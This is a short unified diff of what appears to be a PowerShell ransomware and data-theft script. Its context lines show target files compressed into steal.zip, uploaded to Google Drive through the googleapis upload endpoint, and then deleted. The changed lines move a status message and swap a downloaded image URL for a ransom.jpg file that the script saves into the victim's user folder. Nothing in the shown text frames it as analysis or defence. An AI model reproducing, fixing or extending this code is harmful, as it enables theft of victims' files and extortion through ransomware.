@@ -163,7 +163,6 @@ Write-Host "[+] Target files compressed to archive..." -ForegroundColor Green
 Write-Host "[+] Uploading archive to Google drive..." -ForegroundColor Green
 # Start-Sleep -s 5
 # $del = Remove-Item $Destination -Force -Recurse
-Write-Host "[-] Removing archive after upload..." -ForegroundColor Green
 #----------------------------------------------------------------------------------------------------------------------------------------
 #Encrypted Large files to be send to G-Drive
 #----------------------------------------------------------------------------------------------------------------------------------------
@@ -231,6 +230,7 @@ $response = Invoke-RestMethod -Uri "https://www.googleapis.com/upload/drive/v3/f
 #$Source = "C:\temp"
 #$Destination = "C:\Users\$env:USERNAME\Desktop\StolenFiles"
 # Start-Sleep -s 10
+Write-Host "[-] Removing archive after upload..." -ForegroundColor Green
 Remove-Item c:\temp\steal.zip
 # Start-Sleep -s 5
 Write-Host "[-] Archive deleted..." -ForegroundColor Green
@@ -416,8 +416,8 @@ Start-Sleep 1
 $delay -= 1	  
 }
 $Form.Close()
-$background = "https://raw.githubusercontent.com/ecoterror443/filerepo/main/img.png"
-Invoke-WebRequest -Uri $background -OutFile "c:/users/$env:USERNAME/ransom.jpg"
+$background = "https://raw.githubusercontent.com/ecoterror443/filerepo/main/ransom.jpg"
+Invoke-WebRequest -Uri $background -OutFile "c:/users/$env:USERNAME/ransom.jpg" 
 # Start-Sleep -s 2
 <#
 #Set-ItemProperty -path 'HKCU:\Control Panel\Desktop\' -name WallPaper -value ''
